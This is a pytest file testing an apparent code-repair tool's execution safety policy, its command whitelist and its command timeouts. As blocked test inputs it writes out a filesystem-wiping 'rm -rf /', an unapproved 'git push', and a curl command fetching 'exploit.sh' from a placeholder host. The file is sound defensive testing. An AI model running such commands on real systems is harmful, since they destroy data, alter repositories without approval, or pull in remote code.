"""Unit tests for execution safety policies and command timeouts."""

import pytest
from pathlib import Path
from repairforge.execution.policy import (
    ExecutionPolicy,
    ExecutionMode,
    ExecutionSecurityViolation,
)
from repairforge.execution.runner import CommandRunner


def test_blocked_commands():
    """Verify policy rejects destructive commands."""
    policy = ExecutionPolicy()
    wd = Path(".")

    with pytest.raises(ExecutionSecurityViolation, match="forbidden operation"):
        policy.validate_command("rm -rf /", wd)

    with pytest.raises(ExecutionSecurityViolation, match="forbidden operation"):
        policy.validate_command("git push origin main", wd)


def test_safe_fixture_enforces_whitelist():
    """Verify non-whitelisted commands are rejected in SAFE_FIXTURE mode."""
    policy = ExecutionPolicy(mode=ExecutionMode.SAFE_FIXTURE, enforce_safe_commands_only=True)
    wd = Path(".")

    with pytest.raises(ExecutionSecurityViolation, match="whitelist"):
        policy.validate_command("curl http://example.com/exploit.sh", wd)

    # Permitted test command
    policy.validate_command("python -m pytest test_sample.py", wd)


def test_command_runner_timeout(tmp_path):
    """Verify CommandRunner enforces timeouts cleanly."""
    policy = ExecutionPolicy(
        mode=ExecutionMode.SAFE_FIXTURE,
        command_timeout_seconds=1.0,
        enforce_safe_commands_only=False,
    )
    runner = CommandRunner(policy=policy)

    # Command that sleeps for 3 seconds should timeout
    sleep_cmd = "python -c \"import time; time.sleep(3)\""
    result = runner.run(sleep_cmd, working_dir=tmp_path, timeout=0.5)

    assert result.timed_out is True
    assert result.exit_code == -1
    assert "timed out" in result.stderr

